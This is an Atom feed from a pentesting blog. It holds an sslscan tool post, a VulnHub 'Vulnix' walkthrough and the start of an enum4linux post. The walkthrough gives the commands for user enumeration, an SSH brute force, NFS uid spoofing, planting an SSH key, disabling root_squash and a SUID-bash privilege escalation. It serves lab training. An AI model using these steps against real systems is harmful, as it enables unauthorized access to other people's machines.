<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2017-06-24T08:36:01-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[sslscan - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/24/sslscan-kali-linux-tools/"/>
    <updated>2017-06-24T07:36:03-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/24/sslscan-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to assess the SSL security posture of a target by listing the supported cipher suites. sslscan is a fast SSL/TLS scanner that has been extended from its original version, and at the time of this post, its last update was 2 days ago.</p>

<p>Homepage: <a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a></p>

<!-- more -->


<h2>sslscan description</h2>

<blockquote><p>sslscan  queries SSL/TLS services, such as HTTPS, in order to determine the ciphers that are supported.</p>

<p>SSLScan is designed to be easy, lean and fast. The output includes preferred  ciphers of the SSL/TLS service, and
text and XML output formats are supported. It is TLS SNI aware when used with a  supported  version of OpenSSL.</p>

<p>Output is colour coded to indicate security issues. Colours are as follows:</p>

<p>Red Background:  NULL cipher (no encryption)</p>

<p>Red:             Broken cipher (&lt;= 40 bit), broken  protocol  (SSLv2  or SSLv3) or broken certificate signing
algorithm (MD5)</p>

<p>Yellow:           Weak  cipher  (&lt;=  56  bit or RC4) or weak certificate signing algorithm (SHA-1)</p>

<p>Purple:          Anonymous cipher (ADH or AECDH)</p></blockquote>

<p>Manpage: <a href="http://manpages.ubuntu.com/manpages/xenial/man1/sslscan.1.html">http://manpages.ubuntu.com/manpages/xenial/man1/sslscan.1.html</a></p>

<h2>sslscan options</h2>

<p>```</p>

<pre><code>       ___ ___| |___  ___ __ _ _ __
      / __/ __| / __|/ __/ _` | '_ \
      \__ \__ \ \__ \ (_| (_| | | | |
      |___/___/_|___/\___\__,_|_| |_|


    1.11.10-static
    OpenSSL 1.0.2-chacha (1.0.2g-dev)
</code></pre>

<p>Command:
  sslscan [Options] [host:port | host]</p>

<p>Options:
  &mdash;targets=<file>     A file containing a list of hosts to check.</p>

<pre><code>                   Hosts can  be supplied  with ports (host:port)
</code></pre>

<p>  &mdash;sni-name=<name>    Hostname for SNI
  &mdash;ipv4               Only use IPv4
  &mdash;ipv6               Only use IPv6
  &mdash;show-certificate   Show full certificate information
  &mdash;no-check-certificate  Don&rsquo;t warn about weak certificate algorithm or keys
  &mdash;show-client-cas    Show trusted CAs for TLS client auth
  &mdash;show-ciphers       Show supported client ciphers
  &mdash;show-cipher-ids    Show cipher ids
  &mdash;show-times         Show handhake times in milliseconds
  &mdash;ssl2               Only check SSLv2 ciphers
  &mdash;ssl3               Only check SSLv3 ciphers
  &mdash;tls10              Only check TLSv1.0 ciphers
  &mdash;tls11              Only check TLSv1.1 ciphers
  &mdash;tls12              Only check TLSv1.2 ciphers
  &mdash;tlsall             Only check TLS ciphers (all versions)
  &mdash;ocsp               Request OCSP response from server
  &mdash;pk=<file>          A file containing the private key or a PKCS#12 file</p>

<pre><code>                   containing a private key/certificate pair
</code></pre>

<p>  &mdash;pkpass=<password>  The password for the private  key or PKCS#12 file
  &mdash;certs=<file>       A file containing PEM/ASN1 formatted client certificates
  &mdash;no-ciphersuites    Do not check for supported ciphersuites
  &mdash;no-fallback        Do not check for TLS Fallback SCSV
  &mdash;no-renegotiation   Do not check for TLS renegotiation
  &mdash;no-compression     Do not check for TLS compression (CRIME)
  &mdash;no-heartbleed      Do not check for OpenSSL Heartbleed (CVE-2014-0160)
  &mdash;starttls-ftp       STARTTLS setup for FTP
  &mdash;starttls-imap      STARTTLS setup for IMAP
  &mdash;starttls-irc       STARTTLS setup for IRC
  &mdash;starttls-ldap      STARTTLS setup for LDAP
  &mdash;starttls-pop3      STARTTLS setup for POP3
  &mdash;starttls-smtp      STARTTLS setup for SMTP
  &mdash;starttls-mysql     STARTTLS setup for MYSQL
  &mdash;starttls-xmpp      STARTTLS setup for XMPP
  &mdash;starttls-psql      STARTTLS setup for PostgreSQL
  &mdash;xmpp-server        Use a server-to-server XMPP handshake
  &mdash;http               Test a HTTP connection
  &mdash;rdp                Send RDP preamble before starting scan
  &mdash;bugs               Enable SSL implementation bug work-arounds
  &mdash;timeout=<sec>      Set socket timeout. Default is 3s
  &mdash;sleep=<msec>       Pause between connection request. Default is disabled
  &mdash;xml=<file>         Output results to an XML file</p>

<pre><code>                   &lt;file&gt; can be -, which means stdout
</code></pre>

<p>  &mdash;version            Display the program version
  &mdash;verbose            Display verbose output
  &mdash;no-cipher-details  Disable EC curve names and EDH/RSA key lengths output
  &mdash;no-colour          Disable coloured output
  &mdash;help               Display the  help text  you are  now reading</p>

<p>Example:
  sslscan 127.0.0.1
  sslscan [::1]
```</p>

<h2>sslscan usage</h2>

<p>```
sslscan <a href="https://www.cylance.com">https://www.cylance.com</a>
Version: 1.11.10-static
OpenSSL 1.0.2-chacha (1.0.2g-dev)</p>

<p>Testing SSL server www.cylance.com on port 443 using SNI name www.cylance.com</p>

<p>  TLS Fallback SCSV:
Server supports TLS Fallback SCSV</p>

<p>  TLS renegotiation:
Secure session renegotiation supported</p>

<p>  TLS Compression:
Compression disabled</p>

<p>  Heartbleed:
TLS 1.2 not vulnerable to heartbleed
TLS 1.1 not vulnerable to heartbleed
TLS 1.0 not vulnerable to heartbleed</p>

<p>  Supported Server Cipher(s):
Preferred TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA256       Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA384       Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  AES128-GCM-SHA256          <br/>
Accepted  TLSv1.2  128 bits  AES128-SHA256              <br/>
Accepted  TLSv1.2  128 bits  AES128-SHA                 <br/>
Accepted  TLSv1.2  256 bits  AES256-GCM-SHA384          <br/>
Accepted  TLSv1.2  256 bits  AES256-SHA256              <br/>
Accepted  TLSv1.2  256 bits  AES256-SHA                 <br/>
Accepted  TLSv1.2  112 bits  DES-CBC3-SHA               <br/>
Preferred TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  128 bits  AES128-SHA                 <br/>
Accepted  TLSv1.1  256 bits  AES256-SHA                 <br/>
Accepted  TLSv1.1  112 bits  DES-CBC3-SHA               <br/>
Preferred TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  128 bits  AES128-SHA                 <br/>
Accepted  TLSv1.0  256 bits  AES256-SHA                 <br/>
Accepted  TLSv1.0  112 bits  DES-CBC3-SHA</p>

<p>  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048</p>

<p>Subject:  <em>.cylance.com
Altnames: DNS:</em>.cylance.com, DNS:cylance.com, DNS:www.cylance.com, DNS:info.cylance.com, DNS:blog.cylance.com, DNS:education.cylance.com, DNS:support.cylance.com
Issuer:   DigiCert SHA2 Secure Server CA</p>

<p>Not valid before: May 24 00:00:00 2017 GMT
Not valid after:  May 29 12:00:00 2018 GMT
```</p>

<p>```</p>

<hr />

<p>/ Q: Do you know what the death rate \
\ around here is? A: One per person. /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackLAB Vulnix]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix/"/>
    <updated>2017-06-20T08:04:29-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix</id>
    <content type="html"><![CDATA[<p>Vulnix is an older machine from VulnHub that intends to present vulnerabilities from a misconfiguration point of view. The goal is to get the flag inside /root</p>

<!-- more -->


<p>Here are the Nmap results:</p>

<p><code>
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
25/tcp    open  smtp       Postfix smtpd
79/tcp    open  finger     Linux fingerd
110/tcp   open  pop3?
111/tcp   open  rpcbind    2-4 (RPC #100000)
143/tcp   open  imap       Dovecot imapd
512/tcp   open  exec       netkit-rsh rexecd
513/tcp   open  login
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imap   Dovecot imapd
995/tcp   open  ssl/pop3s?
2049/tcp  open  nfs_acl    2-3 (RPC #100227)
36190/tcp open  status     1 (RPC #100024)
40731/tcp open  mountd     1-3 (RPC #100005)
43539/tcp open  nlockmgr   1-4 (RPC #100021)
46423/tcp open  mountd     1-3 (RPC #100005)
52024/tcp open  mountd     1-3 (RPC #100005)
</code></p>

<h3>finger user enumeration</h3>

<p>There are quite a few services listening on the host. One of the first things that grabbed my attention was finger running on port 79. Because of this, we can use finger to perform <a href="https://pentestlab.blog/tag/finger/">user enumeration</a> on the host. We can use Nmap&rsquo;s script scan to see who is logged on the host, or do it manually. Here I will show the manual way:</p>

<p><code>
finger @192.168.217.142
No one logged on.
</code></p>

<p>The same thing can be achieved by running Nmap with the <em>-sC</em> flag. Next I tried to get more information about the root user:</p>

<p><code>
finger root@192.168.217.142
Login: root                     Name: root
Directory: /root                        Shell: /bin/bash
Never logged in.
No mail.
No Plan.
</code></p>

<p>It seems the root user never logged in, but we still obtained the directory and shell that root uses. I tried a few more guesses and discovered a couple more users on the host:</p>

<p>```
finger <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#x3a;&#x75;&#115;&#101;&#114;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#x32;&#49;&#55;&#46;&#x31;&#x34;&#x32;">&#117;&#x73;&#x65;&#x72;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#46;&#50;&#x31;&#x37;&#x2e;&#x31;&#52;&#x32;</a>
Login: user                     Name: user
Directory: /home/user                   Shell: /bin/bash
Never logged in.
No mail.
No Plan.</p>

<p>Login: dovenull                 Name: Dovecot login user
Directory: /nonexistent                 Shell: /bin/false
Never logged in.
No mail.
No Plan.</p>

<p>finger <a href="&#x6d;&#97;&#105;&#108;&#x74;&#111;&#58;&#x76;&#x75;&#x6c;&#110;&#105;&#x78;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#x32;&#x31;&#55;&#46;&#49;&#x34;&#x32;">&#118;&#117;&#x6c;&#x6e;&#105;&#x78;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#56;&#46;&#50;&#x31;&#55;&#46;&#x31;&#x34;&#50;</a>
Login: vulnix                   Name:
Directory: /home/vulnix                 Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```</p>

<h3>SMTP user enumeration</h3>

<p>Since port 25 is open, we can also attempt some enumeration with SMTP. Again, this can be accomplished with an Nmap script, but this time I want to use an utility called <strong>smtp-user-enum</strong>.</p>

<p>Homepage: <a href="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum">http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum</a></p>

<blockquote><p>smtp-user-enum is a tool for enumerating OS-level user accounts on Solaris via the SMTP service (sendmail).
Enumeration is performed by inspecting the responses to VRFY, EXPN and RCPT TO commands. It could be adapted to
work against other vulnerable SMTP daemons, but this hasn’t been done as of v1.0.</p></blockquote>

<p>Let&rsquo;s see its options:</p>

<p>```
smtp-user-enum v1.2 ( <a href="http://pentestmonkey.net/tools/smtp-user-enum">http://pentestmonkey.net/tools/smtp-user-enum</a> )</p>

<p>Usage: smtp-user-enum.pl [options] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )</p>

<p>options are:</p>

<pre><code>    -m n     Maximum number of processes (default: 5)
-M mode  Method to use for username guessing EXPN, VRFY or RCPT (default: VRFY)
-u user  Check if user exists on remote system
-f addr  MAIL FROM email address.  Used only in "RCPT TO" mode (default: user@example.com)
    -D dom   Domain to append to supplied user list to make email addresses (Default: none)
             Use this option when you want to guess valid email addresses instead of just usernames
             e.g. "-D example.com" would guess foo@example.com, bar@example.com, etc.  Instead of 
                  simply the usernames foo and bar.
-U file  File of usernames to check via smtp service
-t host  Server host running smtp service
-T file  File of hostnames running the smtp service
-p port  TCP port on which smtp service runs (default: 25)
-d       Debugging output
-t n     Wait a maximum of n seconds for reply (default: 5)
-v       Verbose
-h       This help message
</code></pre>

<p>Also see smtp-user-enum-user-docs.pdf from the smtp-user-enum tar ball.</p>

<p>Examples:</p>

<p>$ smtp-user-enum.pl -M VRFY -U users.txt -t 10.0.0.1
$ smtp-user-enum.pl -M EXPN -u admin1 -t 10.0.0.1
$ smtp-user-enum.pl -M RCPT -U users.txt -T mail-server-ips.txt
$ smtp-user-enum.pl -M EXPN -D example.com -U users.txt -t 10.0.0.1
```</p>

<p>I created a file named users.txt with some usernames to try, and fed it to the script:</p>

<p>```
root@kali:~# smtp-user-enum -U users.txt -t 192.168.217.142
Starting smtp-user-enum v1.2 ( <a href="http://pentestmonkey.net/tools/smtp-user-enum">http://pentestmonkey.net/tools/smtp-user-enum</a> )</p>

<hr />



<hr />

<p>Mode &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip; VRFY
Worker Processes &hellip;&hellip;&hellip; 5
Usernames file &hellip;&hellip;&hellip;.. users.txt
Target count &hellip;&hellip;&hellip;&hellip;. 1
Username count &hellip;&hellip;&hellip;.. 6
Target TCP port &hellip;&hellip;&hellip;. 25
Query timeout &hellip;&hellip;&hellip;&hellip; 5 secs
Target domain &hellip;&hellip;&hellip;&hellip;</p>

<h6>## Scan started at Tue Jun 20 09:29:30 2017</h6>

<p>192.168.217.142: root exists
192.168.217.142: vulnix exists
192.168.217.142: user exists
192.168.217.142: postmaster exists
192.168.217.142: mail exists</p>

<h6>## Scan completed at Tue Jun 20 09:29:30 2017</h6>

<p>5 results.</p>

<p>6 queries in 1 seconds (6.0 queries / sec)
```</p>

<p>You can see that this is a pretty cool script that can help you enumerate users pretty fast, and now we know more valid user accounts on the system. You can also use it to find valid email addresses instead of accounts, by using the <em>-D</em> option. I tried a few examples, but got no hits.</p>

<p>Moving on, ports 512-514 are fore the old r-utilities, and if misconfigured, could allow remote access to the host. But in this case, the system asked me for root&rsquo;s SSH password, so I couldn&rsquo;t exploit them.</p>

<h3>Exploit NFS</h3>

<p>We&rsquo;ve done some preliminary enumeration on the target, now it&rsquo;s time to return to the results of the Nmap scan. We&rsquo;ve identified the fact that NFS is running on the Vulnix host. I confirmed it with the use of <em>rpcinfo</em>:</p>

<p>```
rpcinfo -p 192.168.217.142
   program vers proto   port  service</p>

<pre><code>100000    4   tcp    111  portmapper
100000    3   tcp    111  portmapper
100000    2   tcp    111  portmapper
100000    4   udp    111  portmapper
100000    3   udp    111  portmapper
100000    2   udp    111  portmapper
100024    1   udp  39427  status
100024    1   tcp  42309  status
100003    2   tcp   2049  nfs
100003    3   tcp   2049  nfs
100003    4   tcp   2049  nfs
100227    2   tcp   2049
100227    3   tcp   2049
100003    2   udp   2049  nfs
100003    3   udp   2049  nfs
100003    4   udp   2049  nfs
100227    2   udp   2049
100227    3   udp   2049
100021    1   udp  39258  nlockmgr
100021    3   udp  39258  nlockmgr
100021    4   udp  39258  nlockmgr
100021    1   tcp  34418  nlockmgr
100021    3   tcp  34418  nlockmgr
100021    4   tcp  34418  nlockmgr
100005    1   udp  34638  mountd
100005    1   tcp  52581  mountd
100005    2   udp  42603  mountd
100005    2   tcp  53226  mountd
100005    3   udp  49704  mountd
100005    3   tcp  47770  mountd
</code></pre>

<p>```</p>

<p>If NFS wasn&rsquo;t properly configured, we might have access to shares we wouldn&rsquo;t otherwise be allowed to. There are a couple of ways to list the shares, and I&rsquo;m going to show here some of them. Th easiest way is from the command line, with the <code>showmount -e</code> command:</p>

<p><code>
root@kali:~# showmount -e 192.168.217.142
Export list for 192.168.217.142:
/home/vulnix *
</code></p>

<p>Good news! The vulnix home directory is being shared with no restrictions. Before going there, let&rsquo;s see how we can get the same information with Nmap:</p>

<p>```
nmap -sV -p111 &mdash;script=nfs-showmount 192.168.217.142</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-06-21 06:00 EDT
Nmap scan report for 192.168.217.142
Host is up (0.00027s latency).
PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
| nfs-showmount:
|<em>  /home/vulnix *
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      47770/tcp  mountd
|   100005  1,2,3      49704/udp  mountd
|   100021  1,3,4      34418/tcp  nlockmgr
|   100021  1,3,4      39258/udp  nlockmgr
|   100024  1          39427/udp  status
|   100024  1          42309/tcp  status
|   100227  2,3         2049/tcp  nfs_acl
|</em>  100227  2,3         2049/udp  nfs_acl
```</p>

<p>We can also use the <em>auxiliary/scanner/nfs/nfsmount</em> Metasploit module:</p>

<p>```
msf auxiliary(nfsmount) > run</p>

<p>[+] 192.168.217.142:111   &ndash; 192.168.217.142 NFS Export: /home/vulnix [<em>]
[</em>] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```</p>

<p>I mounted the share locally to see what&rsquo;s there. The <em>nolock</em> option disables file locking and it&rsquo;s sometimes required for older NFS servers.</p>

<p><code>
root@kali:/mnt# mkdir nfs
root@kali:/mnt# mount -t nfs -o nolock 192.168.217.142:/home/vulnix /mnt/nfs
</code></p>

<p>However, when I tried to access the newly mounted share, I got permission denied errors. I couldn&rsquo;t <em>chmod</em> or do anything else. After some reading on the interwebz, it seems the likely cause is the <a href="https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-nfs-server-config-exports.html">root_squash</a> option, that nullifies the root privileges of the clients accessing the share, and instead gives them the user ID of the nobody user. It seems to be enabled by default on modern NFS implementations, and you can read more about it <a href="http://www.techrepublic.com/article/working-with-nfs/">here</a>.</p>

<p>After some more digging through the interwebz, I found an <a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">interesting article about nfsshell</a>, which is a userspace NFS client shell. I downloaded it from its <a href="https://github.com/NetDirect/nfsshell">Github page</a>, and to compile I had to install the following <a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">dependencies</a>: <code>apt-get install libreadline-dev libncurses5-dev</code>. Afterwards, I ran <em>make</em> and it compiled fine. Here are its options:</p>

<p><code>
nfs&gt; help
host &lt;host&gt; - set remote host name
uid [&lt;uid&gt; [&lt;secret-key&gt;]] - set remote user id
gid [&lt;gid&gt;] - set remote group id
cd [&lt;path&gt;] - change remote working directory
lcd [&lt;path&gt;] - change local working directory
cat &lt;filespec&gt; - display remote file
ls [-l] &lt;filespec&gt; - list remote directory
get &lt;filespec&gt; - get remote files
df - file system information
rm &lt;file&gt; - delete remote file
ln &lt;file1&gt; &lt;file2&gt; - link file
mv &lt;file1&gt; &lt;file2&gt; - move file
mkdir &lt;dir&gt; - make remote directory
rmdir &lt;dir&gt; - remove remote directory
chmod &lt;mode&gt; &lt;file&gt; - change mode
chown &lt;uid&gt;[.&lt;gid&gt;] &lt;file&gt; -  change owner
put &lt;local-file&gt; [&lt;remote-file&gt;] - put file
mount [-upTU] [-P port] &lt;path&gt; - mount file system
umount - umount remote file system
umountall - umount all remote file systems
export - show all exported file systems
dump - show all remote mounted file systems
status - general status report
help - this help message
quit - its all in the name
bye - good bye
handle [&lt;handle&gt;] - get/set directory file handle
mknod &lt;name&gt; [b/c major minor] [p] - make device
</code></p>

<p>From my reading about NFS and root squashing, it seems that knowing the uid of the share&rsquo;s owner would allow mounting the share as that user and bypassing the access denied errors that I got as root. Because the share is the home folder of the vulnix user, we need to know the uid for that particular user account. But we need local access to the machine to find that out. Well, we did get some usernames from the enumeration stage, so we probably have to attempt a bruteforce attack. From all the discovered usernames, I only kept the user and vulnix ones, because the rest were users for various services on the system. And then I ran Hydra with the recommended task number for SSH:</p>

<p><img class="center" src="/images/pentest/vulnix-hydra.png" title="&lsquo;hydra&rsquo; &lsquo;letmein&rsquo;" ></p>

<p>Hydra found the password for user pretty quickly. I logged in as user, but didn&rsquo;t find anything out of the ordinary. However, I was able to get the uid for the vulnix account:</p>

<p><code>
user@vulnix:~$ id vulnix
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
</code></p>

<p>I went back to nfsshell and made the changes:</p>

<p><code>
nfs&gt; host 192.168.217.142
Using a privileged port (1023)
Open 192.168.217.142 (192.168.217.142) TCP
nfs&gt; uid 2008
nfs&gt; gid 2008
nfs&gt; status
User id      : 2008
Group id     : 2008
Remote host  : `192.168.217.142'
Transfer size: 0
</code></p>

<p>Now I was able to access the share:</p>

<p><code>
nfs&gt; ls -l
drwxr-x---  2     2008  2008      4096  Sep  2  2012  .
drwxr-x---  2     2008  2008      4096  Sep  2  2012  ..
drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bash_logout
drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bashrc
drwxr-x---  2     2008  2008      4096  Sep  2  2012  .profile
</code></p>

<p>Since this is vulnix&rsquo;s home directory, we can put an SSH key in here to allow remote access. I tried the next steps through nfsshell, but I was limited in the commands I could run. So I created a local vulnix user on my machine, and assigned it the uid 2008: <code>root@kali:~# useradd vulnix -u 2008</code>. Then I generated an SSH key pair from this account:</p>

<p><code>
root@kali:~# su vulnix
$ id
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
$ cd /tmp
$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): vulnix
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in vulnix.
Your public key has been saved in vulnix.pub.
The key fingerprint is:
SHA256:P6FAPt9R/0TbOTtQUhk8SiBUlgAtINciO0mUmr2Nrp4 vulnix@kali
The key's randomart image is:
+---[RSA 2048]----+
|  .o.oo.++o+o .oo|
|   +o. o .o. ..+ |
|  = + o .   o...o|
| o = o     . oo.+|
|    = + S o  ..+o|
|   o . + + o  .oo|
|  .     o +    o.|
|  ..       .    .|
|.E.              |
+----[SHA256]-----+
</code></p>

<p>I now navigated without problems to the NFS share, created a .ssh directory and copied the contents of the public key to <em>authorized_keys</em>:</p>

<p><code>
$ cat /tmp/vulnix.pub &gt; .ssh/authorized_keys
$ cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuO5LOA1EIJeaFJHHic7NRNIUvOhBApq7CSu7PAM/THU4hngoZ4kglgFC9QdbsfQsRWLHsDmNcAAGLzIKwkLYXWYanBK/7xdmRmtGf0Sr32zZ4NaXP9B228fjUu5LSi42X/9HcfL9QdfXuB336OvXo43sDzLifrzoiBzlviZV55+uVd+/hI0GCRE3Yi9JrLs1A6NhuHq8xtRLJURhuGwoouA2tGZ+6fSr7t23bC1emBnyUiy2hu/4oS9tLvvptPv1Md9E+Ire6XMjZzCJufcSqiMVrVefnWv5j460TjHhKP7aq23nbzlxMqkZ8r9ovm5KW0UWWWyVPkOFSxPgFEaRr vulnix@kali
</code></p>

<p>And I was able to login with the key: <code>ssh -i /tmp/vulnix <a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x76;&#x75;&#108;&#110;&#105;&#x78;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#50;&#x31;&#55;&#46;&#x31;&#52;&#x32;">&#118;&#117;&#x6c;&#x6e;&#x69;&#120;&#x40;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x32;&#49;&#55;&#x2e;&#x31;&#52;&#x32;</a></code>. After some enumeration, I discovered that the vulnix user can edit <code>/etc/exports</code> with sudo privileges:</p>

<p>```
vulnix@vulnix:~$ sudo -l
Matching &lsquo;Defaults&rsquo; entries for vulnix on this host:</p>

<pre><code>env_reset,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</code></pre>

<p>User vulnix may run the following commands on this host:</p>

<pre><code>(root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
</code></pre>

<p>```</p>

<p>This is wonderful news. First of all, we need to disable <em>root_squash</em>. Then we can mount the root directory and read the flag, or we can leave a shell binary in vulnix&rsquo;s home directory, and run it later with root privileges. Let&rsquo;s do just that! I disabled root squashing with <code>/home/vulnix    *(rw,no_root_squash)</code>. Then I copied the bash executable:</p>

<p><code>
vulnix@vulnix:~$ cp /bin/bash /home/vulnix/
vulnix@vulnix:~$ ls -l
total 900
-rwxr-xr-x 1 vulnix vulnix 920788 Jun 21 14:46 bash
</code></p>

<p>For the NFS configuration changes to take effect, I needed to make the NFS service to reload its configuration file or restart it, but I didn&rsquo;t have permissions to do that. So I rebooted the machine (but unmounted the share first). After rebooting, I mounted the share again, navigated to it as root with no problems, and changed permissions on the bash shell to make it SUID: <code>chmod 4777 bash</code> (I also copied it again as root).</p>

<p>From the SSH, I verified it as the vulnix user:</p>

<p><code>
vulnix@vulnix:~$ ls -l bash
-rwsrwxrwx 1 root root 920788 Jun 21 15:34 bash
</code></p>

<p>Finally, I ran the shell while preserving its permissions:</p>

<p><code>
vulnix@vulnix:~$ ./bash -p
bash-4.2# whoami
root
bash-4.2# cat /root/trophy.txt
cc614640424f5bd60ce5d5264899c3be
</code></p>

<p>Not done yet, I cracked the MD5 hash to reveal the name of the l33t name of the author: Reb00tu53r. This was a fun one!</p>

<p><strong>Learn more</strong></p>

<ul>
<li><p><a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">NFSShell on Kali Linux</a></p></li>
<li><p><a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">Using nfsshell to compromise older environments</a></p></li>
<li><p><a href="http://www.techrepublic.com/article/working-with-nfs/">Working with NFS</a></p></li>
</ul>


<p>```</p>

<hr />

<p>/ Q: What do you call a half-dozen    \
| Indians with Asian flu? A: Six sick |
\ Sikhs (sic).                        /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[enum4linux - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/19/enum4linux-kali-linux-tools/"/>
    <updated>2017-06-19T10:08:57-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/19/enum4linux-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: enumerate shares on a target and gather as much information as possible. enum4linux is a Perl script that can get the job done.</p>

<p>Homepage: <a href="https://labs.portcullis.co.uk/tools/enum4linux/">https://labs.portcullis.co.uk/tools/enum4linux/</a></p>

<!-- more -->


<h2>enum4linux description</h2>

<blockquote><p>A Linux alternative to enum.exe for enumerating data from Windows and Samba hosts.</p>

<p>Enum4linux is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar
functionality to enum.exe formerly available from www.bindview.com.</p>

<p>It is written in Perl and is basically a wrapper around the Samba tools smbclient, rpclient, net and nmblookup.</p>

<p>Key features:</p>

<ul>
<li><p>RID cycling (When RestrictAnonymous is set to 1 on Windows 2000)</p></li>
<li><p>User listing (When RestrictAnonymous is set to 0 on Windows 2000)</p></li>
<li><p>Listing of group membership information</p></li>
<li><p>Share enumeration</p></li>
<li><p>Detecting if host is in a workgroup or a domain</p></li>
<li><p>Identifying the remote operating system</p></li>
<li><p>Password policy retrieval (using polenum)</p></li>
</ul>
</blockquote>

<h2>enum4linux options</h2>

<p>```
num4linux
enum4linux v0.8.9 (<a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a>)
Copyright &copy; 2011 Mark Lowe (<a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#109;&#x72;&#108;&#64;&#112;&#x6f;&#x72;&#x74;&#99;&#x75;&#x6c;&#x6c;&#x69;&#x73;&#45;&#115;&#101;&#99;&#x75;&#114;&#x69;&#116;&#121;&#46;&#99;&#111;&#x6d;">&#109;&#114;&#x6c;&#64;&#112;&#111;&#114;&#116;&#99;&#x75;&#x6c;&#x6c;&#x69;&#x73;&#45;&#x73;&#101;&#x63;&#x75;&#114;&#x69;&#x74;&#x79;&#46;&#99;&#x6f;&#109;</a>)</p>

<p>Simple wrapper around the tools in the samba package to provide similar
functionality to enum.exe (formerly from www.bindview.com).  Some additional
features such as RID cycling have also been added for convenience.</p>

<p>Usage: ./enum4linux.pl [options] ip</p>

<p>Options are (like &ldquo;enum&rdquo;):</p>

<pre><code>-U        get userlist
-M        get machine list*
-S        get sharelist
